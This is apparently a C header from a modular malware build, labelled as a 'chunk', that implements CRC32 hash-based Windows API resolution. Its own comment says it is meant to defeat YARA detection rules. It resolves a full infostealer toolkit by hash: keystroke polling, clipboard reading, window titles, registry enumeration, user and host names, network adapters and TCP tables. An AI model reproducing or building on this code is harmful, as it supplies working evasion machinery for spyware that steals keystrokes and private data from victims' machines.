// chunk: api_resolve/api_hash_crc32
// depends: (none)
// provides: crc32_hash, resolve_api, api, resolve_all_apis
// headers: windows.h
// note: CRC32 hash-based API resolution — standard polynomial 0xEDB88320, defeats DJB2/FNV1a hash-constant YARA rules

#ifndef CHUNK_API_HASH_CRC32
#define CHUNK_API_HASH_CRC32

#include <windows.h>

static const DWORD crc32_table[256] = {
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
    0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
    0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
    0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
    0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
    0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
    0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
    0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
    0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
    0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
    0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
    0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
    0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
    0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
    0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
    0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
    0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
    0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
    0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
    0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
};

static DWORD crc32_hash(const char *str) {
    DWORD crc = 0xFFFFFFFF;
    while (*str)
        crc = (crc >> 8) ^ crc32_table[(crc ^ (BYTE)*str++) & 0xFF];
    return crc ^ 0xFFFFFFFF;
}

static FARPROC resolve_api(HMODULE mod, DWORD hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (crc32_hash(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* kernel32 */
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *fn_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindClose)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void   (WINAPI *fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL   (WINAPI *fn_GetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD  (WINAPI *fn_GetLogicalDriveStringsA)(DWORD, LPSTR);
typedef UINT   (WINAPI *fn_GetDriveTypeA)(LPCSTR);
typedef void   (WINAPI *fn_GetLocalTime)(LPSYSTEMTIME);
typedef int    (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef int    (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HMODULE(WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef DWORD  (WINAPI *fn_GetLastError)(void);
/* advapi32 */
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef LONG   (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG   (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG   (WINAPI *fn_RegCloseKey)(HKEY);
/* user32 */
typedef BOOL   (WINAPI *fn_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int    (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);
typedef BOOL   (WINAPI *fn_OpenClipboard)(HWND);
typedef HANDLE (WINAPI *fn_GetClipboardData)(UINT);
typedef BOOL   (WINAPI *fn_CloseClipboard)(void);
typedef HWND   (WINAPI *fn_GetForegroundWindow)(void);
typedef SHORT  (WINAPI *fn_GetAsyncKeyState)(int);
typedef void   (WINAPI *fn_keybd_event)(BYTE, BYTE, DWORD, ULONG_PTR);
/* shell32 */
typedef HRESULT(WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
/* iphlpapi */
typedef ULONG  (WINAPI *fn_GetAdaptersInfo)(/*PIP_ADAPTER_INFO*/void*, PULONG);
typedef DWORD  (WINAPI *fn_GetExtendedTcpTable)(PVOID, PDWORD, BOOL, ULONG, /*TCP_TABLE_CLASS*/int, ULONG);

/* Pre-computed CRC32 hashes (polynomial 0xEDB88320) */
#define H_CreateFileA              0x553B5C78u
#define H_ReadFile                 0x095C03D0u
#define H_WriteFile                0xCCE95612u
#define H_CloseHandle              0xB09315F4u
#define H_CreateProcessA           0xA851D916u
#define H_CopyFileA                0x0199DC99u
#define H_GetFileAttributesA       0x30601C1Cu
#define H_DeleteFileA              0x919B6BCBu
#define H_CreatePipe               0xA21572CEu
#define H_WaitForSingleObject      0xE058BB45u
#define H_GetFileSize              0xA7FB4165u
#define H_GetTempPathA             0xF3771641u
#define H_GetComputerNameA         0xBA83C4F6u
#define H_Sleep                    0xCEF2EDA8u
#define H_GetTickCount             0x5B4219F8u
#define H_VirtualAlloc             0x09CE0D4Au
#define H_FindFirstFileA           0xC9EBD5CEu
#define H_FindNextFileA            0x75272948u
#define H_FindClose                0xD82BF69Au
#define H_CreateDirectoryA         0x814DB6ADu
#define H_GetEnvironmentVariableA  0x2F87D308u
#define H_GetNativeSystemInfo      0xEB64C435u
#define H_GetDiskFreeSpaceExA      0x96C138E6u
#define H_GetLogicalDriveStringsA  0x54216660u
#define H_GetDriveTypeA            0xF6A56750u
#define H_GetLocalTime             0x1BB43D20u
#define H_MultiByteToWideChar      0x72F11E39u
#define H_WideCharToMultiByte      0x9A80E589u
#define H_GetModuleHandleA         0xB1866570u
#define H_GetLastError             0xD2E536B7u
#define H_GetUserNameA             0x59761A93u
#define H_RegOpenKeyExA            0xC13A7AD3u
#define H_RegQueryValueExA         0xB039ADFEu
#define H_RegEnumValueA            0x0941C1EBu
#define H_RegEnumKeyExA            0xFF49584Fu
#define H_RegCloseKey              0xA9290135u
#define H_EnumWindows              0x435A600Bu
#define H_GetWindowTextA           0xC7F07F09u
#define H_OpenClipboard            0xB44DDFCAu
#define H_GetClipboardData         0x1DCBD147u
#define H_CloseClipboard           0x99C1926Cu
#define H_GetForegroundWindow      0x5D79D927u
#define H_GetAsyncKeyState         0x84029700u
#define H_keybd_event              0x9EDF9282u
#define H_SHGetFolderPathA         0x33B19E6Eu
#define H_GetAdaptersInfo          0x32A4B9E0u
#define H_GetExtendedTcpTable      0x32AB3239u

static struct {
    /* kernel32 */
    fn_CreateFileA       pCreateFileA;
    fn_ReadFile          pReadFile;
    fn_WriteFile         pWriteFile;
    fn_CloseHandle       pCloseHandle;
    fn_CreateProcessA    pCreateProcessA;
    fn_CopyFileA         pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA       pDeleteFileA;
    fn_CreatePipe        pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize       pGetFileSize;
    fn_GetTempPathA      pGetTempPathA;
    fn_GetComputerNameA  pGetComputerNameA;
    fn_Sleep             pSleep;
    fn_GetTickCount      pGetTickCount;
    fn_VirtualAlloc      pVirtualAlloc;
    fn_FindFirstFileA    pFindFirstFileA;
    fn_FindNextFileA     pFindNextFileA;
    fn_FindClose         pFindClose;
    fn_CreateDirectoryA  pCreateDirectoryA;
    fn_GetEnvironmentVariableA pGetEnvironmentVariableA;
    fn_GetNativeSystemInfo pGetNativeSystemInfo;
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA;
    fn_GetLogicalDriveStringsA pGetLogicalDriveStringsA;
    fn_GetDriveTypeA     pGetDriveTypeA;
    fn_GetLocalTime      pGetLocalTime;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_GetLastError      pGetLastError;
    /* advapi32 */
    fn_GetUserNameA      pGetUserNameA;
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegEnumValueA     pRegEnumValueA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegCloseKey       pRegCloseKey;
    /* user32 */
    fn_EnumWindows       pEnumWindows;
    fn_GetWindowTextA    pGetWindowTextA;
    fn_OpenClipboard     pOpenClipboard;
    fn_GetClipboardData  pGetClipboardData;
    fn_CloseClipboard    pCloseClipboard;
    fn_GetForegroundWindow pGetForegroundWindow;
    fn_GetAsyncKeyState pGetAsyncKeyState;
    fn_keybd_event     pkeybd_event;
    /* shell32 */
    fn_SHGetFolderPathA  pSHGetFolderPathA;
    /* iphlpapi */
    fn_GetAdaptersInfo   pGetAdaptersInfo;
    fn_GetExtendedTcpTable pGetExtendedTcpTable;
} api = {0};

static int resolve_all_apis(void) {
    HMODULE k32 = LoadLibraryA("kernel32.dll");
    HMODULE adv = LoadLibraryA("advapi32.dll");
    HMODULE u32 = LoadLibraryA("user32.dll");
    HMODULE sh32 = LoadLibraryA("shell32.dll");
    HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
    if (!k32) return 0;

    /* kernel32 */
    api.pCreateFileA       = (fn_CreateFileA)resolve_api(k32, H_CreateFileA);
    api.pReadFile          = (fn_ReadFile)resolve_api(k32, H_ReadFile);
    api.pWriteFile         = (fn_WriteFile)resolve_api(k32, H_WriteFile);
    api.pCloseHandle       = (fn_CloseHandle)resolve_api(k32, H_CloseHandle);
    api.pCreateProcessA    = (fn_CreateProcessA)resolve_api(k32, H_CreateProcessA);
    api.pCopyFileA         = (fn_CopyFileA)resolve_api(k32, H_CopyFileA);
    api.pGetFileAttributesA = (fn_GetFileAttributesA)resolve_api(k32, H_GetFileAttributesA);
    api.pDeleteFileA       = (fn_DeleteFileA)resolve_api(k32, H_DeleteFileA);
    api.pCreatePipe        = (fn_CreatePipe)resolve_api(k32, H_CreatePipe);
    api.pWaitForSingleObject = (fn_WaitForSingleObject)resolve_api(k32, H_WaitForSingleObject);
    api.pGetFileSize       = (fn_GetFileSize)resolve_api(k32, H_GetFileSize);
    api.pGetTempPathA      = (fn_GetTempPathA)resolve_api(k32, H_GetTempPathA);
    api.pGetComputerNameA  = (fn_GetComputerNameA)resolve_api(k32, H_GetComputerNameA);
    api.pSleep             = (fn_Sleep)resolve_api(k32, H_Sleep);
    api.pGetTickCount      = (fn_GetTickCount)resolve_api(k32, H_GetTickCount);
    api.pVirtualAlloc      = (fn_VirtualAlloc)resolve_api(k32, H_VirtualAlloc);
    api.pFindFirstFileA    = (fn_FindFirstFileA)resolve_api(k32, H_FindFirstFileA);
    api.pFindNextFileA     = (fn_FindNextFileA)resolve_api(k32, H_FindNextFileA);
    api.pFindClose         = (fn_FindClose)resolve_api(k32, H_FindClose);
    api.pCreateDirectoryA  = (fn_CreateDirectoryA)resolve_api(k32, H_CreateDirectoryA);
    api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)resolve_api(k32, H_GetEnvironmentVariableA);
    api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)resolve_api(k32, H_GetNativeSystemInfo);
    api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)resolve_api(k32, H_GetDiskFreeSpaceExA);
    api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)resolve_api(k32, H_GetLogicalDriveStringsA);
    api.pGetDriveTypeA     = (fn_GetDriveTypeA)resolve_api(k32, H_GetDriveTypeA);
    api.pGetLocalTime      = (fn_GetLocalTime)resolve_api(k32, H_GetLocalTime);
    api.pMultiByteToWideChar = (fn_MultiByteToWideChar)resolve_api(k32, H_MultiByteToWideChar);
    api.pWideCharToMultiByte = (fn_WideCharToMultiByte)resolve_api(k32, H_WideCharToMultiByte);
    api.pGetModuleHandleA  = (fn_GetModuleHandleA)resolve_api(k32, H_GetModuleHandleA);
    api.pGetLastError      = (fn_GetLastError)resolve_api(k32, H_GetLastError);

    /* advapi32 */
    if (adv) {
        api.pGetUserNameA      = (fn_GetUserNameA)resolve_api(adv, H_GetUserNameA);
        api.pRegOpenKeyExA     = (fn_RegOpenKeyExA)resolve_api(adv, H_RegOpenKeyExA);
        api.pRegQueryValueExA  = (fn_RegQueryValueExA)resolve_api(adv, H_RegQueryValueExA);
        api.pRegEnumValueA     = (fn_RegEnumValueA)resolve_api(adv, H_RegEnumValueA);
        api.pRegEnumKeyExA     = (fn_RegEnumKeyExA)resolve_api(adv, H_RegEnumKeyExA);
        api.pRegCloseKey       = (fn_RegCloseKey)resolve_api(adv, H_RegCloseKey);
    }

    /* user32 */
    if (u32) {
        api.pEnumWindows       = (fn_EnumWindows)resolve_api(u32, H_EnumWindows);
        api.pGetWindowTextA    = (fn_GetWindowTextA)resolve_api(u32, H_GetWindowTextA);
        api.pOpenClipboard     = (fn_OpenClipboard)resolve_api(u32, H_OpenClipboard);
        api.pGetClipboardData  = (fn_GetClipboardData)resolve_api(u32, H_GetClipboardData);
        api.pCloseClipboard    = (fn_CloseClipboard)resolve_api(u32, H_CloseClipboard);
        api.pGetForegroundWindow = (fn_GetForegroundWindow)resolve_api(u32, H_GetForegroundWindow);
        api.pGetAsyncKeyState  = (fn_GetAsyncKeyState)resolve_api(u32, H_GetAsyncKeyState);
        api.pkeybd_event       = (fn_keybd_event)resolve_api(u32, H_keybd_event);
    }

    /* shell32 */
    if (sh32) {
        api.pSHGetFolderPathA  = (fn_SHGetFolderPathA)resolve_api(sh32, H_SHGetFolderPathA);
    }

    /* iphlpapi */
    if (iphlp) {
        api.pGetAdaptersInfo   = (fn_GetAdaptersInfo)resolve_api(iphlp, H_GetAdaptersInfo);
        api.pGetExtendedTcpTable = (fn_GetExtendedTcpTable)resolve_api(iphlp, H_GetExtendedTcpTable);
    }

    return api.pCreateFileA != NULL;
}

#endif
